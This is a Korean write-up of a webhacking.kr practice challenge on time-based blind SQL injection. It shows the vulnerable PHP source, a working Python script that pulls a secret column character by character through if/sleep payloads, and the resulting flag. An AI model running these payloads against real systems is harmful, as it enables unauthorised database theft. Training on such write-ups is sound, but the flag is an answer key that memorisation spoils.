# blind SQL injection

message와 secret의 값을 받는 인풋영역이 있다. 

소스는 아래와 같다.

```php+HTML
<?php
  include "../../config.php";
  include "./flag.php";
  if($_GET['view_source']) view_source();
?><html>
<head>
<title>Challenge 57</title>
</head>
<body>
<?php
  $db = dbconnect();
  if($_GET['msg'] && isset($_GET['se'])){
    $_GET['msg'] = addslashes($_GET['msg']);
    $_GET['se'] = addslashes($_GET['se']);
    if(preg_match("/select|and|or|not|&|\||benchmark/i",$_GET['se'])) exit("Access Denied");
    mysqli_query($db,"insert into chall57(id,msg,pw,op) values('{$_SESSION['id']}','{$_GET['msg']}','{$flag}',{$_GET['se']})");
    echo "Done<br><br>";
    if(rand(0,100) == 1) mysqli_query($db,"delete from chall57");
  }
?>
<form method=get action=index.php>
<table border=0>
<tr><td>message</td><td><input name=msg size=50 maxlength=50></td></tr>
<tr><td>secret</td><td><input type=radio name=se value=1 checked>yes<br><br><input type=radio name=se value=0>no</td></tr>
<tr><td colspan=2 align=center><input type=submit></td></tr>
</table>
</form>
<br><br><a href=./?view_source=1>view-source</a>
</body>
</html>
```

SQL injection 문제라는 것을 알 수 있다. 
필터링에 benchmark 함수가 있는데 시간을 측정하는 거다. 
즉, blind SQL injection이고 시간차를 이용해서 pw값을 알아낼 수 있음을 유추할 수 있다. 

아래와 같은 코드를 작성해서 pw를 알아낸다. 

```python
import requests
import time

cookies={'PHPSESSID':'1uv1k3nmdjkp58kt643v5al23t'}
url = "https://webhacking.kr/challenge/web-34/index.php"

pw_length = 0
pw = []

for i in range(40):
    query = f"?msg=test&se=if(length(pw)={i},sleep(1),1)"
    itime = time.time()
    res = requests.get(url+query, cookies=cookies)
    restime = time.time() - itime
    if restime > 1:
        pw_length = i
        break
    
print(pw_length)

for i in range(pw_length):
    for j in range(33, 127):
        query = f"?msg=test&se=if(ascii(substr(pw,{str(i+1)},1))={str(j)},sleep(1),1)"
        itime = time.time()
        res = requests.get(url+query, cookies=cookies)
        restime = time.time() - itime
        if restime > 1:
            pw.append(chr(j))
            print(''.join(pw))
            break

print(''.join(pw))

# >> FLAG{y2u.be/kmPgjr0EL64}
```



> blind SQL injection에서 직접코드로 시간차를 구해서 값을 알아낸 것은 처음이었다. 
>
> SQL의 if문에는 =으로 표현하는 것, ascii함수 등. 배운것이 많았다.

